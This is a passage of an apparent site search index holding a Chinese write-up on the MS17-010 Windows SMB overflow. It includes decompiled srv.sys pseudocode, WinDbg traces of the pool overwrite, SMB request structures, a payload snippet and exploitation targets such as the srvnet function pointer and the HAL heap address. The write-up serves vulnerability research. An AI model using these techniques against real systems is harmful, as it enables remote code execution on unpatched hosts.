\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1eCVE-2017-0143\u3001CVE-2017-0144\u3001CVE-2017-0145\u3001CVE-2017-0146\u3001CVE-2017-0147\u3001CVE-2017-0148\u5728\u5185\u76846\u4e2aSMB\u6f0f\u6d1e\u7684\u653b\u51fb\u3002","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2017-0143........\uff09\u3010MS17-010\u3011Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_2","text":"\u200b \u76ee\u524d\u5df2\u77e5\u53d7\u5f71\u54cd\u7684 Windows \u7248\u672c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1aWindows NT\uff0cWindows 2000\u3001Windows XP\u3001Windows 2003\u3001Windows Vista\u3001Windows 7\u3001Windows 8\uff0cWindows 2008\u3001Windows 2008 R2\u3001Windows Server 2012 SP0\u3002","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2017-0143........\uff09\u3010MS17-010\u3011Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_3","text":"","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2017-0143........\uff09\u3010MS17-010\u3011Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_4","text":"","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2017-0143........\uff09\u3010MS17-010\u3011Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#0x01-ms17-010","text":"\u7b2c\u4e00\u4e2a\uff1a\u6f0f\u6d1e\u5373Fea list\u8f6c\u6362NT Fea list\u89e6\u53d1\u7684overflow\uff1b\u901a\u8fc7srv buff\u5bf9\u8c61\u8986\u76d6\u4e86\u540e\u7eed\u7684srvnet buff\u7684\u7ed3\u6784\u4f53 \u95ee\u9898\u51fa\u73b0\u518dSrvOs2FeaListSizeToNt \u51fd\u6570\u4e2d\uff0c\u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a unsigned int __fastcall SrvOs2FeaListSizeToNt ( int pOs2Fea ) { unsigned int v1 ; // edi@1 int Length ; // ebx@1 int pBody ; // esi@1 unsigned int v4 ; // ebx@1 int v5 ; // ecx@3 int v8 ; // [sp+10h] [bp-8h]@3 unsigned int v9 ; // [sp+14h] [bp-4h]@1 v1 = 0 ; Length = * ( _DWORD * ) pOs2Fea ; // \u8fd9\u91cc\u4ee5DWORD\u7c7b\u578b\u83b7\u53d6length pBody = pOs2Fea + 4 ; v9 = 0 ; v4 = pOs2Fea + Length ; while ( pBody lt ; v4 ) { if ( pBody + 4 gt ; = v4 || ( v5 = * ( _BYTE * )( pBody + 1 ) + * ( _WORD * )( pBody + 2 ), v8 = * ( _BYTE * )( pBody + 1 ) + * ( _WORD * )( pBody + 2 ), v5 + pBody + 5 gt ; v4 ) ) { // \u8fd9\u91cc\u4ee5WORD\u66f4\u65b0length\u7684\u4f4e\u4f4d2\u5b57\u8282 // \u521d\u59cb\u503c\u662f0x10000,\u6700\u7ec8\u53d8\u6210\u4e860x1ff7E * ( _WORD * ) pOs2Fea = pBody - pOs2Fea ; return v1 ; // \u8fd9\u91cc\u8fd4\u56de\u7684\u5927\u5c0f\u4e3a\u540e\u7eed\u7528\u4e8e\u5185\u5b58\u7533\u8bf7 } if ( RtlULongAdd ( v1 , ( v5 + 0xC ) amp ; 0xFFFFFFFC , amp ; v9 ) lt ; 0 ) return 0 ; v1 = v9 ; pBody += v8 + 5 ; } return v1 ; } \u4f7f\u7528windbg\u6765\u52a8\u6001\u8c03\u8bd5\uff0c\u5148\u67e5\u8be2SrvOs2FeaListToNt\u4e2d SrvOs2FeaListSizeToNt \u8c03\u7528\u7684\u7ed3\u679c\uff1a kd gt ; p srv ! SrvOs2FeaListToNt + 0 x15 : a6f7a57a 8 b7510 mov esi , dword ptr [ ebp + 10 h ] kd gt ; r eax = 00010 fe8 ebx = 884241 e0 ecx = 837 a70ea edx = 0000008 f esi = 83797008 edi = 837970 d8 eip = a6f7a57a esp = 90 b2bb70 ebp = 90 b2bb7c iopl = 0 nv up ei pl nz ac pe nc cs = 0008 ss = 0010 ds = 0023 es = 0023 fs = 0030 gs = 0000 efl = 00000216 srv ! SrvOs2FeaListToNt + 0 x15 : a6f7a57a 8 b7510 mov esi , dword ptr [ ebp + 10 h ] ss : 0010 : 90 b2bb8c = 90 b2bba8 # \u65ad\u70b9 bp srv ! SrvOs2FeaListToNt + 0 x10 bp srv ! SrvOs2FeaListToNt + 0 x33 \u6b64\u65f6\u83b7\u53d6\u5230\u7684\u5927\u5c0f\u4e3a0x10fe8\uff0c\u540e\u7eed\u53d8\u66f4\u8be5\u503c\u8fdb\u884c\u5185\u5b58\u7533\u8bf7(\u51cf\u53bb9\u5b57\u8282) srv ! SrvOs2FeaListSizeToNt + 0X5E 96759506 2 bf0 sub esi , eax 96759508 668930 mov word ptr [ eax ] , si # \u8fd9\u91cc\u66f4\u65b0size\u4ee5WORD\u7c7b\u578b \u8c03\u8bd5\u4e2d\u53ef\u4ee5\u770b\u5230\u5bf9\u5e94\u7684size\u5927\u5c0f kd gt ; r eax = a381b0d8 ebx = 0000008 f ecx = a382b0ea edx = 0000008 f esi = 0000 ff7e edi = a382b0d8 eip = 96759508 esp = 8 ca43b54 ebp = 8 ca43b64 iopl = 0 nv up ei pl nz ac pe nc cs = 0008 ss = 0010 ds = 0023 es = 0023 fs = 0030 gs = 0000 efl = 00000216 srv ! SrvOs2FeaListSizeToNt + 0x60 : 96759508 668930 mov word ptr [ eax ] , si ds : 0023 : a381b0d8 = 0000 si\u4e3a: 0xff7e, \u5728SrvOs2FeaListToNt\u51fd\u6570\u4e2d\u83b7\u53d6\u5230size\u503c\u540e\u4f1a\u5f15\u7528\u8be5\u503c\u8bbe\u7f6e\u8fb9\u754c\u503c\uff0c\u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a unsigned int __fastcall SrvOs2FeaListToNt ( int pOs2Fea , int * pArgNtFea , int * a3 , _WORD * a4 ) { __int16 v5 ; // bx@1 unsigned int Size ; // eax@1 NTFEA * pNtFea ; // ecx@3 int pOs2FeaBody ; // esi@9 int v10 ; // edx@9 unsigned int v11 ; // esi@14 int v12 ; // [sp+Ch] [bp-Ch]@11 unsigned int v14 ; // [sp+20h] [bp+8h]@9 v5 = 0 ; Size = SrvOs2FeaListSizeToNt ( pOs2Fea ); // \u83b7\u53d6\u7684\u5927\u5c0f\u4e3a0x10fe8 * a3 = Size ; if ( ! Size ) { * a4 = 0 ; return 0xC098F0FF ; } pNtFea = ( NTFEA * ) SrvAllocateNonPagedPool ( Size , 0x15 ); // \u5185\u5b58\u7533\u8bf7 * pArgNtFea = ( int ) pNtFea ; if ( pNtFea ) { pOs2FeaBody = pOs2Fea + 4 ; // \u540e\u7eed\u5f15\u7528\u8be5\u503c\u4e3a\u904d\u5386\u7684\u8d77\u59cb\u5730\u5740 v10 = ( int ) pNtFea ; v14 = pOs2Fea + * ( _DWORD * ) pOs2Fea - 5 ; // \u8fd9\u91cc\u8bbe\u7f6e\u8fb9\u754c\u5730\u5740size-5 if ( pOs2Fea + 4 gt ; v14 ) { LABEL_13 : if ( pOs2FeaBody == pOs2Fea + * ( _DWORD * ) pOs2Fea ) { * ( _DWORD * ) v10 = 0 ; return 0 ; } v11 = 0xC0000001 ; * a4 = v5 - pOs2Fea ; } else { while ( ! ( * ( _BYTE * ) pOs2FeaBody amp ; 0x7F ) ) { v12 = ( int ) pNtFea ; v5 = pOs2FeaBody ; // \u8d77\u59cb\u5730\u5740 pNtFea = ( NTFEA * ) SrvOs2FeaToNt ( pNtFea , pOs2FeaBody ); // memmove\u89e6\u53d1 pOs2FeaBody += * ( _BYTE * )( pOs2FeaBody + 1 ) + * ( _WORD * )( pOs2FeaBody + 2 ) + 5 ; // \u76ee\u6807\u5730\u5740pNtFea\u7684\u5927\u5c0f\u4e3a\uff1a0x10fe8 // \u6e90\u5730\u5740pOs2FeaBody\u7684\u5927\u5c0f\u4e3a\uff1a0x1ff75 // \u6b64\u65f6\u53d1\u751f\u4e86\u8d8a\u754c\u64cd\u4f5c if ( pOs2FeaBody gt ; v14 ) { v10 = v12 ; goto LABEL_13 ; } } * a4 = pOs2FeaBody - pOs2Fea ; v11 = 0xC000000D ; } SrvFreeNonPagedPool ( * pArgNtFea ); return v11 ; } if ( BYTE1 ( WPP_GLOBAL_Control - gt ; Flags ) gt ; = 2u amp ; amp ; WPP_GLOBAL_Control - gt ; Characteristics amp ; 1 amp ; amp ; KeGetCurrentIrql () lt ; 2u ) { _DbgPrint ( SrvOs2FeaListToNt: Unable to allocate %d bytes from nonpaged pool. , * a3 , 0 ); _DbgPrint ( \\n ); } return 0xC0000205 ; } \u52a8\u6001\u8c03\u8bd5\u4ee5\u4e0b\u6c47\u7f16\u4ee3\u7801\u53ef\u4ee5\u83b7\u53d6\u5230\u7528\u4e8e\u8fb9\u754c\u5224\u65ad\u7684\u5730\u5740\u8303c\u56f4\uff1a a6f7a5f1 f6067f test byte ptr [ esi ] , 7 Fh a6f7a5f4 753 c jne srv ! SrvOs2FeaListToNt + 0xcd ( a6f7a632 ) a6f7a5f6 56 push esi // \u8fd9\u91cc\u4e3a\u8d77\u59cb\u5730\u5740 a6f7a5f7 50 push eax a6f7a5f8 894508 mov dword ptr [ ebp+8 ] , eax a6f7a5fb 8975 fc mov dword ptr [ ebp-4 ] , esi a6f7a5fe e828fcffff call srv ! SrvOs2FeaToNt ( a6f7a22b ) a6f7a603 0 fb65601 movzx edx , byte ptr [ esi+1 ] a6f7a607 0 fb74e02 movzx ecx , word ptr [ esi+2 ] a6f7a60b 03 d6 add edx , esi a6f7a60d 8 d740a05 lea esi , [ edx+ecx+5 ] a6f7a611 3 bf3 cmp esi , ebx // \u83b7\u53d6ebx\u5373\u53ef\u5f97\u5230\u8fb9\u754c\u5730\u5740 # \u65ad\u70b9 bp srv ! SrvOs2FeaListToNt + 0x91 \u83b7\u53d6\u8d77\u59cb\u5730\u5740 bp srv ! SrvOs2FeaListToNt + 0xac \u83b7\u53d6\u8fb9\u754c\u5730\u5740 \u901a\u8fc7\u8fb9\u754c\u5730\u5740-\u8d77\u59cb\u5730\u5740\u53ef\u4ee5\u5f97\u5230\u5177\u4f53\u7684\u5927\u5c0f srv ! SrvOs2FeaListToNt + 0 x91 : a6f7a5f6 56 push esi kd gt ; r eax = 865 a5008 ebx = 8 ef72051 ecx = 0001 ff7e edx = 00000000 esi = 8 ef520dc edi = 8 ef520d8 eip = a6f7a5f6 esp = 8 ba67b6c ebp = 8 ba67b7c iopl = 0 nv up ei pl zr na pe nc cs = 0008 ss = 0010 ds = 0023 es = 0023 fs = 0030 gs = 0000 efl = 00000246 srv ! SrvOs2FeaListToNt + 0 x91 : a6f7a5f6 56 push esi srv ! SrvOs2FeaListToNt + 0 xac : a6f7a611 3 bf3 cmp esi , ebx kd gt ; r eax = 865 a5014 ebx = 8 ef72051 ecx = 00000000 edx = 8 ef520dc esi = 8 ef520e1 edi = 8 ef520d8 eip = a6f7a611 esp = 8 ba67b6c ebp = 8 ba67b7c iopl = 0 nv up ei ng nz na po nc cs = 0008 ss = 0010 ds = 0023 es = 0023 fs = 0030 gs = 0000 efl = 00000282 srv ! SrvOs2FeaListToNt + 0 xac : a6f7a611 3 bf3 cmp esi , ebx ebx - esi = 0 x8ef72051 - 0 x8ef520dc = 0 x1ff75 \u5728\u524d\u9762SrvOs2FeaListSizeToNt\u83b7\u53d6\u7684\u5927\u5c0f\u4e5f\u5c31\u662f\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e3a\uff1a0x10fe8\uff0c\u800c\u4f7f\u7528\u7684\u8fb9\u754c\u5927\u5c0f\u4e3a\uff1a0x1ff75(\u8fd9\u91cc\u4e3a\u4ec0\u4e48\u4e0esize\u6709\u51fa\u5165\u662f\u56e0\u4e3a\u8d77\u59cb\u5730\u5740\u79fb\u52a8\u4e864\u5b57\u8282\uff0c\u540c\u65f6\u8fb9\u754c\u5927\u5c0f\u4e5f\u51cf\u5c0f\u4e865\u5b57\u8282) \u4e3a\u4e86\u67e5\u770b\u6ea2\u51fa\u8986\u76d6\u7684\u5177\u4f53\u7ec6\u8282\uff0c\u9700\u8981\u5b9a\u4f4d\u5230\u6267\u884c\u6700\u540e\u4e00\u6b21memmove\u7684\u64cd\u4f5c\uff1a \u901a\u8fc7while\u5faa\u73af\u8df3\u51fa\uff0c\u5728\u8df3\u51fa\u4f4d\u7f6e\u4e0b\u65ad\u70b9\uff0c\u8ba1\u7b97\u5faa\u73af\u4e86\u591a\u5c11\u6b21 \u76f4\u63a5\u901a\u8fc7memmove\u8bbe\u7f6e\u6761\u4ef6\u65ad\u70b9(\u901a\u8fc7payload\u77e5\u9053\u5927\u90e8\u5206\u7684\u64cd\u4f5c\u590d\u5236\u5b57\u8282\u6570\u90fd\u4e3a0) SrvOs2FeaToNt\u4f2a\u4ee3\u7801\uff1a unsigned int __fastcall SrvOs2FeaToNt ( int a1 , int a2 ) { int v4 ; // edi@1 _BYTE * v5 ; // edi@1 unsigned int result ; // eax@1 v4 = a1 + 8 ; * ( _BYTE * )( a1 + 4 ) = * ( _BYTE * ) a2 ; * ( _BYTE * )( a1 + 5 ) = * ( _BYTE * )( a2 + 1 ); * ( _WORD * )( a1 + 6 ) = * ( _WORD * )( a2 + 2 ); _memmove (( void * )( a1 + 8 ), ( const void * )( a2 + 4 ), * ( _BYTE * )( a2 + 1 )); v5 = ( _BYTE * )( * ( _BYTE * )( a1 + 5 ) + v4 ); * v5 ++ = 0 ; _memmove ( v5 , ( const void * )( a2 + 5 + * ( _BYTE * )( a1 + 5 )), * ( _WORD * )( a1 + 6 )); //\u8fd9\u91cc\u4ea7\u751f\u7684\u8d8a\u754c\u8986\u76d6 result = ( unsigned int ) amp ; v5 [ * ( _WORD * )( a1 + 6 ) + 3 ] amp ; 0xFFFFFFFC ; * ( _DWORD * ) a1 = result - a1 ; return result ; } \u7b2c\u4e00\u79cd\uff1a\u5224\u5b9awhile\u5faa\u73af\u6267\u884c\u4e86\u591a\u5c11\u6b21c # \u8fd9\u91cc\u901a\u8fc7\u4e34\u65f6\u5bc4\u5b58\u5668\u6765\u8ba1\u6570 r $ t0 = 0 # a6f7a5f4 753 c jne srv ! SrvOs2FeaListToNt + 0xcd ( a6f7a632 ) bp srv ! SrvOs2FeaListToNt + 0x8f .if (@zf=0) {} .else {gc} # a6f7a5f6 56 push esi // \u8fd9\u91cc\u4e3a\u8d77\u59cb\u5730\u5740 bp srv ! SrvOs2FeaListToNt + 0x91 r $t0=@$t0+1;g; # \u67e5\u770b\u8ba1\u6570 kd gt ; r $ t0 $ t0 = 0000025 b \u7b2c\u4e8c\u79cd\uff1a\u901a\u8fc7srv!SrvOs2FeaToNt\u4e2d\u7684memmove\u4e0b\u65ad\u8fdb\u884c\u5b9a\u4f4d bp srv!SrvOs2FeaToNt+0x4d .if (poi(esp+8) != 0) {gc} .else {} \u8fd9\u91cc\u662f\u56e0\u4e3apayload\u77e5\u9053\u4e86memmove\u524d\u9762\u90fd\u662f\u8fdb\u884c0\u5b57\u8282\u7684copy\u3002 kd gt ; dd esp 94 b1bb38 86 adec31 a2e86c99 0000 f3bd 86 adec30 kd gt ; dd esp 94 b1bb38 86 aedff9 a2e9605b 0000008 f 86 aedff8 // \u6700\u540e\u4e00\u6b21\u7684\u5927\u5c0f\u4e3a 0 x8f \u901a\u8fc7\u4e0a\u9762\u53ef\u4ee5\u77e5\u9053\uff0c\u76ee\u6807\u5730\u5740\u4e3a\uff1a86aedff9\uff0c\u590d\u5236\u7684\u5b57\u8282\u6570\u4e3a\uff1a0x8f\uff1b \u63a5\u7740\u67e5\u770bpool\u4fe1\u606f\uff1a kd gt ; ! pool 86 aedff9 Pool page 86 aedff9 region is Nonpaged pool * 86 add000 : large page allocation , Tag is LSdb , size is 0 x11000 bytes Pooltag LSdb : data buffer kd gt ; ? 86 aedff9 + 8 f Evaluate expression : - 2035359608 = 86 aee088 // \u8d8a\u754c\u540e\u7ed3\u675f\u5730\u5740 kd gt ; ! pool 86 aee088 Pool page 86 aee088 region is Nonpaged pool 86 aee000 size : 8 previous size : 0 ( Free ) .... * 86 aee000 : large page allocation , Tag is LSbf , size is 0 x11000 bytes Pooltag LSbf : buffer descriptor \u53d1\u751f\u4e86\u8d8a\u754c\u8986\u76d6 \u67e5\u770b\u8986\u76d6\u524d\u7684\u5185\u5b58\u4fe1\u606f\uff1a kd gt; db 86aee000 86aee000+88 86aee000 00 10 01 00 00 00 00 00-ff ff 00 00 00 00 00 00 ................ 86aee010 ff ff 00 00 c0 f0 df ff-c0 f0 df ff 00 00 00 00 ................ 86aee020 00 00 00 00 64 0b 00 00-00 f1 df ff 00 00 00 00 ....d........... 86aee030 00 00 00 00 10 e0 ae 86-00 f1 df ff 00 00 00 00 ................ 86aee040 60 00 04 10 00 00 00 00-80 ef df ff 00 00 00 00 `............... 86aee050 10 00 d0 ff ff ff ff ff-10 01 d0 ff ff ff ff ff ................ 86aee060 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 86aee070 60 00 04 10 00 00 00 00-00 00 00 00 00 00 00 00 `............... 86aee080 90 ff cf ff ff ff ff ff-fa \u67e5\u770b\u8986\u76d6\u540e\u7684\u5185\u5b58\u4fe1\u606f\uff1a kd gt; db 86aee000 86aee000+88 86aee000 00 10 01 00 00 00 00 00-ff ff 00 00 00 00 00 00 ................ 86aee010 ff ff 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 86aee020 00 00 00 00 00 00 00 00-00 f1 df ff 00 00 00 00 ................ 86aee030 00 00 00 00 20 f0 df ff-00 f1 df ff 00 00 00 00 .... ........... 86aee040 60 00 04 10 00 00 00 00-80 ef df ff 00 00 00 00 `............... 86aee050 10 00 d0 ff ff ff ff ff-10 01 d0 ff ff ff ff ff ................ 86aee060 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 86aee070 60 00 04 10 00 00 00 00-00 00 00 00 00 00 00 00 `............... 86aee080 90 ff cf ff ff ff ff ff-fa \u7b2c\u4e8c\u4e2a\uff1a\u53d1\u9001SMB_COM_NT_TRANSACT\u5e76\u9644\u5e26FEA LIST\u548c\u591a\u4e2atranscation\uff0c\u670d\u52a1\u7aef\u4f1a\u901a\u8fc7 SMB_COM_TRANSACTION2_SECONDARY\u5c06SMB_COM_NT_TRANSACT\u4f5c\u4e3aSMB_COM_TRANSACTION2\u5904\u7406\uff1b\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u4f20\u5165FEA LIST\u5927\u4e8e0xffff\u5927\u5c0f\u7684\u6570\u636e\uff0c\u56e0\u4e3aSMB_COM_NT_TRANSACT\u957f\u5ea6\u5b57\u6bb5\u7c7b\u578b\u4e3aULONG\uff0c\u800cSMB_COM_TRANSACTION2\u4e3aUSHORT\u7c7b\u578b \u6838\u5fc3\u95ee\u9898\uff1a\u5bf9\u4e8e transaction\u7c7b\u578b\u7684\u6821\u9a8c\uff0c\u53ea\u662f\u4ee5\u6700\u540e\u63a5\u6536\u7684*_SECONDARY\u7c7b\u578b\u4e3a\u51c6\uff0c\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7SMB_COM_NT_TRANSACT\u4f20\u9012payload\uff0c\u5e76\u4ee5SMB_COM_TRANSACTION2_SECONDARY\u7ed3\u5c3e\uff0c\u8fd9\u6837\u5c31\u9020\u6210\u4e86\u9519\u8bef\u89e3\u6790\uff0c\u5c06SMB_COM_NT_TRANSACT\u4ee5SMB_COM_TRANSACTION2\u7c7b\u578b\u8fdb\u884c\u89e3\u6790 SMB Message Structure # The SMB_Header structure is a fixed 32 - bytes in length . SMB_Header { UCHAR Protocol [ 4 ] ; UCHAR Command ; SMB_ERROR Status ; UCHAR Flags ; USHORT Flags2 ; USHORT PIDHigh ; UCHAR SecurityFeatures [ 8 ] ; USHORT Reserved ; USHORT TID ; USHORT PIDLow ; USHORT UID ; USHORT MID ; } # SMB_Parameters { UCHAR WordCount ; USHORT Words [ WordCount ] ( variable ); } # SMB_Data { USHORT ByteCount ; UCHAR Bytes [ ByteCount ] ( variable ); } \u901a\u8fc7PID\u3001MID\u3001TID\u3001UID\u6765\u5339\u914d\u662f\u5426\u76f8\u540c\uff0c\u4f1a\u5728\u670d\u52a1\u7aef\u5c06\u5176\u7ec4\u88c5\u4e3a\u540c\u4e00\u7c7b\u578btrancation \u7b2c\u4e09\u4e2a\uff1a\u5728\u5904\u7406 SMB_COM_SESSION_SETUP_ANDX \u547d\u4ee4\u65f6\uff0c\u4f1a\u4ee513\u7c7b\u578b\u7684\u8bf7\u6c42\u65b9\u5f0f\u5904\u740612\u8bf7\u6c42\u7684\u6570\u636e\uff1b\u8fd9\u6837\u65e2\u53ef\u4ee5\u7a33\u5b9a\u63a7\u5236\u8fde\u7eedpool\u5185\u5b58\u7684\u7533\u8bf7\u548c\u91ca\u653e SMB_COM_TREE_CONNECT_ANDX SMB_COM_SESSION_SETUP_ANDX # SMB_COM_SESSION_SETUP_ANDX # LM and NTLM authentication # NT Security request SMB_Parameters { UCHAR WordCount ; // 0xD = 13 Words { UCHAR AndXCommand ; UCHAR AndXReserved ; USHORT AndXOffset ; USHORT MaxBufferSize ; USHORT MaxMpxCount ; USHORT VcNumber ; ULONG SessionKey ; USHORT OEMPasswordLen ; USHORT UnicodePasswordLen ; ULONG Reserved ; ULONG Capabilities ; } } SMB_Data { USHORT ByteCount ; Bytes { UCHAR OEMPassword [] ; UCHAR UnicodePassword [] ; UCHAR Pad [] ; SMB_STRING AccountName [] ; SMB_STRING PrimaryDomain [] ; SMB_STRING NativeOS [] ; SMB_STRING NativeLanMan [] ; } } # extended security request SMB_Parameters { UCHAR WordCount ; // 0xC = 12 Words { UCHAR AndXCommand ; UCHAR AndXReserved ; USHORT AndXOffset ; USHORT MaxBufferSize ; USHORT MaxMpxCount ; USHORT VcNumber ; ULONG SessionKey ; USHORT SecurityBlobLength ; ULONG Reserved ; ULONG Capabilities ; } } SMB_Data { USHORT ByteCount ; Bytes { UCHAR SecurityBlob [ SecurityBlobLength ] ; SMB_STRING NativeOS [] ; SMB_STRING NativeLanMan [] ; } } \u6f0f\u6d1e\u51fd\u6570BlockingSessionSetupAndX\u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a BlockingSessionSetupAndX(request, smbHeader) { // check word count if (! (request- gt;WordCount == 13 || (request- gt;WordCount == 12 amp; amp; (request- gt;Capablilities amp; CAP_EXTENDED_SECURITY))) ) { // error and return } // ... if ((request- gt;Capablilities amp; CAP_EXTENDED_SECURITY) amp; amp; (smbHeader- gt;Flags2 amp; FLAGS2_EXTENDED_SECURITY)) { // this request is Extend Security request GetExtendSecurityParameters(request); // extract parameters and data to variables SrvValidateSecurityBuffer(request); // do authentication } else { // this request is NT Security request GetNtSecurityParameters(request); // extract parameters and data to variables SrvValidateUser(request); // do authentication } // ... } \u53d1\u9001Extended Security request(12)\u9644\u5e26CAP_EXTENDED_SECURITY\uff0c\u5e76\u672a\u9644\u5e26FLAG2_EXTENDED_SECURITY\uff0c\u5c06\u8be5\u8bf7\u6c42\u4f2a\u88c5\u6210\u4e3aSMB_COM_SESSION_SETUP_ANDX(13) \u8fd9\u6837\u5c31\u4f1a\u5c06\u8bf7\u6c42\u4ee5NT Security request(13)\u8fdb\u884c\u5904\u7406\uff0c\u8fdb\u5165\u51fd\u6570GetNtSecurityParameters,\u5728\u8be5\u51fd\u6570\u4e2d\u4f1a\u901a\u8fc7wordcount\u548cbytecount\u8ba1\u7b97\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\uff0c\u4f4612\u7c7b\u578b\u548c13\u7c7b\u578b\u4e2d\u7684bytecount\u504f\u79fb\u4e0d\u540c\uff0c\u56e0\u6b64\u5f5312\u7c7b\u578b\u88ab\u4f5c\u4e3a13\u7c7b\u578b\u89e3\u6790\u65f6\uff0c\u4f1a\u89e3\u6790\u5230SecurityBlob\u4f5c\u4e3abytecount\u5927\u5c0f \u8fd9\u91cc\u7684\u4e3b\u8981\u95ee\u9898\u662f\uff1a\u5f53\u8bbe\u5b9aFLAGS2_EXTENDED_SECURITY\u548cCAP_EXTENDED_SECURITY\uff0c\u5219\u5c06\u8bf7\u6c42\u6309\u7167Extended Security request(12)\u5904\u7406\uff0c\u5426\u5219\u6309\u7167NT Security request(13)\u8fdb\u884c\u5904\u7406\u3002 \u5728payload\u4e2d\u7684\u5229\u7528\uff1a sessionSetup[ Parameters ] = smb.SMBSessionSetupAndX_Extended_Parameters() sessionSetup[ Data ] = pack( lt;H , reqSize) + \\x00 *20 // \u8fd9\u91cc\u6700\u7ec8\u89e3\u679012\u7c7b\u578b\u4e2dSMB_Data.Bytes\u7684\u5934\u4e24\u4e2a\u5b57\u8282\u4e3a\u89e3\u6790\u7684\u5927\u5c0f(\u572813\u7c7b\u578b\u4e2d\u7684ByteCount) \u8fd9\u91cc\u7684sessionSetup[\\'Data\\']\u5373\u4e3aSMB_Data.Bytes,\u56e0\u6b64\u5934\u4e24\u4e2a\u5b57\u8282\u5c31\u662freqSize \u81f3\u6b64\u4e09\u4e2a\u6f0f\u6d1e\u641e\u660e\u767d\u540e\uff0c\u4f46\u5bf9\u4e8e\u6574\u4e2a\u6f0f\u6d1e\u94fe\u662f\u5982\u4f55\u4e32\u8d77\u6765\u7684\u8fd8\u662f\u6bd4\u8f83\u6a21\u7cca\uff0c\u4f8b\u5982\uff1a \u5982\u4f55\u5229\u7528\u6f0f\u6d1e1\u7684\u8d8a\u754c\u6765\u89e6\u53d1\u547d\u4ee4\u6267\u884c \u5982\u4f55\u5229\u7528\u6f0f\u6d1e2\u4f20\u5165FEA LIST\uff0c\u4e5f\u5c31\u662f\u53ef\u63a7\u7684\u6570\u636e\u7528\u6765\u89e6\u53d1\u6f0f\u6d1e1 \u6f0f\u6d1e3\u53ea\u662f\u8fdb\u884c\u4e86Non-Paged pool\u7533\u8bf7\uff0c\u5b9e\u73b0\u4e86\u5360\u5751\u4f46\u6ca1\u6709\u8fdb\u884c\u91ca\u653e\uff0c\u5185\u90e8\u5e03\u5c40\u5982\u4f55\u6784\u9020","title":"0x01 \u5148\u5173\u6ce8MS17-010\u4e2d\u4f7f\u7528\u7684\u4e09\u4e2a\u5173\u952e\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2017-0143........\uff09\u3010MS17-010\u3011Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#0x02","text":"\u4e3a\u4e86\u89e6\u53d1\u547d\u4ee4\u6267\u884c\uff0c\u8fd9\u91cc\u5f15\u51fa\u5173\u952e\u6570\u636e\u7ed3\u6784srvnet\uff0c\u5176\u4e2d\u67092\u4e2a\u5173\u952e\u5b57\u6bb5\uff1a MDL(pMDl1): memory descriptor list;\u5c06I/O\u6570\u636e\u5199\u5165\u5230\u6307\u5b9a\u7684MDL\u6307\u5b9a\u865a\u62df\u5730\u5740\u4e2d\uff0c\u5728\u5b9e\u9645\u5229\u7528\u4e2dclient\u53d1\u9001\u7684\u6570\u636e\u4f1a\u5199\u5165\u5230\u6307\u5b9a\u7684\u865a\u62df\u5730\u5740\u4e2d\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f20\u5165\u53ef\u63a7\u7684\u6570\u636e\u5230\u6307\u5b9a\u7684\u5730\u5740 pSrvNetWskStruct: \u6307\u5411SrvNetWskStruct\u7ed3\u6784\u4f53\uff0c\u8be5\u7ed3\u6784\u4f53\u4e2d\u5b58\u5728\u4e00\u4e2a\u51fd\u6570\u6307\u9488HandlerFunction\uff0c\u8be5\u51fd\u6570\u4f1a\u5728srvnet\u8fde\u63a5\u4e2d\u65ad\u65f6\u8fdb\u884c\u8c03\u7528\uff1b\u90a3\u4e48\u5982\u679cpSrvNetWskStruct\u6307\u5411\u7684\u7ed3\u6784\u4f53\u662f\u4f2a\u9020\u7684\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5f88\u987a\u5229\u7684\u89e6\u53d1\u547d\u4ee4\u6267\u884c \u8fd9\u91cc\u5229\u7528\u7684\u5730\u5740\u4e3aHAL\u7684heap\u7684\u56fa\u5b9a\u5730\u5740\uff0c\u56e0\u4e3a\u5728\u8be5\u6bb5\u5730\u5740\u662f\u53ef\u6267\u884c\u7684 0xffd00000 # 32\u4f4d 0xffffffff ffd00000 # 64\u4f4d \u53ea\u8981\u80fd\u901a\u8fc7\u8d8a\u754c\u63a7\u5236\u8fd9\u4e24\u4e2a\u5b57\u6bb5\u5c31\u53ef\u4ee5\u4e86\uff0c\u4f46\u5982\u4f55\u5c06srv buff\u548csrvnet buff\u62fc\u63a5\u5230\u4e00\u8d77\uff1f","title":"0x02 